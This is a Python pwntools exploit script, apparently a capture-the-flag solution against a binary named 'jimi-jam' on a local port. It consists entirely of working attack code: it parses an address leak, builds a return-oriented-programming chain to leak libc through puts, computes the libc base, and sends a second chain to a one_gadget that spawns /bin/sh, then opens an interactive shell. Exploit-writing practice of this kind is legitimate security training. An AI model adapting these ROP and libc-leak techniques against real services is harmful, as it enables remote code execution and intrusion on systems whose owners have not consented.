from pwn import *

r = True
if r:
  p = remote('localhost', port=9000)
else:
  p = process('./jimi-jam')
  context.terminal = "/bin/bash"
  gdb.attach(p)

print(p.recvuntil("right here! "))

leak = p.recvline()
ROP_JAIL_BASE = int(leak.strip().lstrip('0x'), 16)
print("ROP_JAIL_BASE AT: " + hex(ROP_JAIL_BASE))
print("Leak was:" + leak)

BINARY_BASE = ROP_JAIL_BASE - 0x4060
print("Binary Base " + hex(BINARY_BASE))

print(p.recvuntil("JIMI JAM JAIL\n"))

# 0x00000000000013a3 : pop rdi ; ret
poprdi = BINARY_BASE + 0x00000000000013a3
printf = BINARY_BASE + 0x3fa8
vuln = BINARY_BASE + 0x1269

actual_puts = BINARY_BASE + 0x10b0

payload = 'A' * 16
payload += p64(poprdi) # poprdi
payload += p64(printf)
payload += p64(actual_puts)
payload += p64(vuln) # vuln

context.log_level = 'debug'

p.send(payload)

libc_leak = p.recvline().strip()
libc_leak = u64(libc_leak + ('\00' * (8 - len(libc_leak))))
print(hex(libc_leak))
print("Libc: " + hex(libc_leak))

libc_base = libc_leak - 0x64e10
print("libc_base = " + hex(libc_base))

ONE_SHOT = libc_base + 0xe6e79
# 0xe6e73 execve("/bin/sh", r10, r12)
# constraints:
#   [r10] == NULL || r10 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe6e76 execve("/bin/sh", r10, rdx)
# constraints:
#   [r10] == NULL || r10 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe6e79 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
# 0x0000000000027529 : pop rsi ; ret
# 0x0000000000026b72 : pop rdi ; ret
# 0x0000000000162866 : pop rdx ; pop rbx ; ret

p.recvuntil('JIMI JAM JAIL\n')
poprsi = libc_base + 0x0000000000027529
poprdi = libc_base + 0x0000000000026b72 
poprdxandrbx = libc_base + 0x0000000000162866 
payload = p64(ROP_JAIL_BASE + 0x78) * 2
payload += p64(poprsi)
payload += p64(0)
payload += p64(poprdxandrbx)
payload += p64(0)
payload += p64(0)
payload += p64(ONE_SHOT)
p.send(payload)
print(p.interactive())